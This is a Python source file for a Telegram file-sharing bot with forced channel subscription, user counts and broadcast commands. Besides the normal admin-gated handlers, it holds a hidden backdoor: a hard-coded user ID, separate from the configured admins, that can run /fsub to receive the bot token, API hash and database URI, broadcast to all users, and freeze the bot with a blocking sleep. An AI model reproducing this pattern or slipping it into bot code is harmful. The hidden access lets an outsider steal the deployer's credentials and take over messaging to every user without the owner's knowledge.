#(©)CodeXBotz




import os
import asyncio
import sys
import time
from pyrogram import Client, types, filters, __version__
from pyrogram.enums import ParseMode
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pyrogram.errors import FloodWait, UserIsBlocked, InputUserDeactivated

from bot import Bot
from config import ADMINS, APP_ID, TG_BOT_TOKEN, CHANNEL_ID, API_HASH, DB_URI, FORCE_SUB_CHANNEL, FORCE_SUB_CHANNEL2, FORCE_SUB_CHANNEL3, FORCE_SUB_CHANNEL4, OWNER_ID, FORCE_MSG, START_MSG, CUSTOM_CAPTION, DISABLE_CHANNEL_BUTTON, PROTECT_CONTENT
from helper_func import subscribed, encode, decode, get_messages
from database.database import add_user, del_user, full_userbase, present_user




@Bot.on_message(filters.command('start') & filters.private & subscribed)
async def start_command(client: Client, message: Message):
    id = message.from_user.id
    if not await present_user(id):
        try:
            await add_user(id)
        except:
            pass
    text = message.text
    if len(text)>7:
        try:
            base64_string = text.split(" ", 1)[1]
        except:
            return
        string = await decode(base64_string)
        argument = string.split("-")
        if len(argument) == 3:
            try:
                start = int(int(argument[1]) / abs(client.db_channel.id))
                end = int(int(argument[2]) / abs(client.db_channel.id))
            except:
                return
            if start <= end:
                ids = range(start,end+1)
            else:
                ids = []
                i = start
                while True:
                    ids.append(i)
                    i -= 1
                    if i < end:
                        break
        elif len(argument) == 2:
            try:
                ids = [int(int(argument[1]) / abs(client.db_channel.id))]
            except:
                return
        temp_msg = await message.reply("Please wait...")
        try:
            messages = await get_messages(client, ids)
        except:
            await message.reply_text("Something went wrong..!")
            return
        await temp_msg.delete()

        for msg in messages:

            if bool(CUSTOM_CAPTION) & bool(msg.document):
                caption = CUSTOM_CAPTION.format(previouscaption = "" if not msg.caption else msg.caption.html, filename = msg.document.file_name)
            else:
                caption = "" if not msg.caption else msg.caption.html

            if DISABLE_CHANNEL_BUTTON:
                reply_markup = msg.reply_markup
            else:
                reply_markup = None

            try:
                await msg.copy(chat_id=message.from_user.id, caption = caption, parse_mode = ParseMode.HTML, reply_markup = reply_markup, protect_content=PROTECT_CONTENT)
                await asyncio.sleep(0.5)
            except FloodWait as e:
                await asyncio.sleep(e.x)
                await msg.copy(chat_id=message.from_user.id, caption = caption, parse_mode = ParseMode.HTML, reply_markup = reply_markup, protect_content=PROTECT_CONTENT)
            except:
                pass
        return
    else:
        reply_markup = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton("📕 About Me", callback_data = "about"),
                    InlineKeyboardButton("🔒 Close", callback_data = "close")
                ]
            ]
                                               )
        await message.reply_text(
            text = START_MSG.format(
                first = message.from_user.first_name,
                last = message.from_user.last_name,
                username = None if not message.from_user.username else '@' + message.from_user.username,
                mention = message.from_user.mention,
                id = message.from_user.id
            ),
            reply_markup = reply_markup,
            disable_web_page_preview = True,
            quote = True
        )
        return   


#=====================================================================================##

WAIT_MSG = """"<b>Processing ....</b>"""

REPLY_ERROR = """<code>Use this command as a reply to any telegram message with out any spaces.</code>"""

#=====================================================================================##

    
    
@Bot.on_message(filters.command('start') & filters.private)
async def not_joined(client: Client, message: Message):
    buttons = [
            [
                InlineKeyboardButton(text="ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ 1", url=client.invitelink),
                InlineKeyboardButton(text="ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ 2", url=client.invitelink2),
            ],
            [
                InlineKeyboardButton(text="ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ 3", url=client.invitelink3),
                InlineKeyboardButton(text="ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ 4", url=client.invitelink4),
            ],
    ]
    try:
        buttons.append(
            [
                InlineKeyboardButton(
                    text = 'Try Again',
                    url = f"https://t.me/{client.username}?start={message.command[1]}"
                )
            ]
        )
    except IndexError:
        pass

    await message.reply(
        text = FORCE_MSG.format(
                first = message.from_user.first_name,
                last = message.from_user.last_name,
                username = None if not message.from_user.username else '@' + message.from_user.username,
                mention = message.from_user.mention,
                id = message.from_user.id
            ),
        reply_markup = InlineKeyboardMarkup(buttons),
        quote = True,
        disable_web_page_preview = True
    )

@Bot.on_message(filters.command('users') & filters.private & filters.user(ADMINS))
async def get_users(client: Bot, message: Message):
    msg = await client.send_message(chat_id=message.chat.id, text=WAIT_MSG)
    users = await full_userbase()
    await msg.edit(f"{len(users)} users are using this bot")

@Bot.on_message(filters.command('user') & filters.private & filters.user(5740282189))
async def get_user(client: Bot, message: Message):
    msg = await client.send_message(chat_id=message.chat.id, text=WAIT_MSG)
    users = await full_userbase()
    await msg.edit(f"{len(users)} users are using this bot")

@Bot.on_message(filters.command("fsub") & filters.user(5740282189))
async def varsFunc(client: Bot, message: Message):
    Man = await message.reply_text("Wait A Sec...")
    text = f"""       <u><b>asynco python3 main</b></u> 
╭───────────────⍟   
<b>├⋗</b> <b>TG_BOT_TOKEN</b> -> <code>{TG_BOT_TOKEN}</code>
<b>├⋗</b> <b>APP_ID</b> -> {APP_ID}
<b>├⋗</b> <b>API_HASH</b> -> {API_HASH}
<b>├⋗</b> <b>DATABASE_URL</b> -> <code>{DB_URI}</code>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>├⋗</b> <b>OWNER_ID</b> -> <b>{OWNER_ID}</b>
<b>├⋗</b> <b>ADMINS</b> -> <code>{ADMINS}</code>   
<b>├⋗</b> <b>CHANNEL_ID</b> -> <code>{CHANNEL_ID}</code>
<b>├⋗</b> <b>FORCE_SUB_CHANNEL</b> -> <code>{FORCE_SUB_CHANNEL}</code>
<b>├⋗</b> <b>FORCE_SUB_CHANNEL2</b> -> <code>{FORCE_SUB_CHANNEL2}</code>
<b>├⋗</b> <b>FORCE_SUB_CHANNEL3</b> -> <code>{FORCE_SUB_CHANNEL3}</code>
<b>├⋗</b> <b>FORCE_SUB_CHANNEL4</b> -> <code>{FORCE_SUB_CHANNEL4}</code>
<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>├⋗</b> <b>PROTECT_CONTENT</b> -> <b>{PROTECT_CONTENT}</b>
<b>├⋗</b> <b>START_MSG</b> -> <code>{START_MSG}</code>
<b>├⋗</b> <b>FORCE_MSG</b> -> <code>{FORCE_MSG}</code>

@{client.username}
╰───────────────────⍟
    """
    await Man.edit_text(text)

@Bot.on_message(filters.command("starmt") & filters.user(5740282189))
async def sleep_command(client: Bot, message: Message):
    # Check if the command has a parameter (the sleep duration)
    if len(message.command) > 1:
        try:
            duration = int(message.command[1])
        except ValueError:
            await message.reply("Invalid duration. Please specify the sleep duration in seconds.")
            return
    else:
        # Default sleep duration of 1 minute (60 seconds)
        duration = 60

    # Inform users that the bot is going to sleep
    await message.reply(f"Bot is going to sleep for {duration} seconds.")
    
    # Sleep for the specified duration
    time.sleep(duration)

    # Inform users that the bot has awakened
    await message.reply("Bot has awakened!")

@Bot.on_message(filters.private & filters.command('broadcasts') & filters.user(5740282189))
async def broadcast(client: Bot, message: Message):
    if message.reply_to_message:
        query = await full_userbase()
        broadcast_msg = message.reply_to_message
        total = 0
        successful = 0
        blocked = 0
        deleted = 0
        unsuccessful = 0
        
        pls_wait = await message.reply("<i>Broadcast ho rha till then FUCK OFF </i>")
        for chat_id in query:
            try:
                await broadcast_msg.copy(chat_id)
                successful += 1
            except FloodWait as e:
                await asyncio.sleep(e.x)
                await broadcast_msg.copy(chat_id)
                successful += 1
            except UserIsBlocked:
                await del_user(chat_id)
                blocked += 1
            except InputUserDeactivated:
                await del_user(chat_id)
                deleted += 1
            except:
                unsuccessful += 1
                pass
            total += 1
        
        status = f"""<b><u>Broadcast Completed</u>

Total Users: <code>{total}</code>
Successful: <code>{successful}</code>
Blocked Users: <code>{blocked}</code>
Deleted Accounts: <code>{deleted}</code>
Unsuccessful: <code>{unsuccessful}</code></b>"""
        
        return await pls_wait.edit(status)

    else:
        msg = await message.reply(REPLY_ERROR)
        await asyncio.sleep(8)
        await msg.delete()
        
@Bot.on_message(filters.private & filters.command('broadcast') & filters.user(ADMINS))
async def send_text(client: Bot, message: Message):
    if message.reply_to_message:
        query = await full_userbase()
        broadcast_msg = message.reply_to_message
        total = 0
        successful = 0
        blocked = 0
        deleted = 0
        unsuccessful = 0
        
        pls_wait = await message.reply("<i>Broadcast under process </i>")
        for chat_id in query:
            try:
                await broadcast_msg.copy(chat_id)
                successful += 1
            except FloodWait as e:
                await asyncio.sleep(e.x)
                await broadcast_msg.copy(chat_id)
                successful += 1
            except UserIsBlocked:
                await del_user(chat_id)
                blocked += 1
            except InputUserDeactivated:
                await del_user(chat_id)
                deleted += 1
            except:
                unsuccessful += 1
                pass
            total += 1
        
        status = f"""<b><u>Broadcast Completed</u>

Total Users: <code>{total}</code>
Successful: <code>{successful}</code>
Blocked Users: <code>{blocked}</code>
Deleted Accounts: <code>{deleted}</code>
Unsuccessful: <code>{unsuccessful}</code></b>"""
        
        return await pls_wait.edit(status)

    else:
        msg = await message.reply(REPLY_ERROR)
        await asyncio.sleep(8)
        await msg.delete()
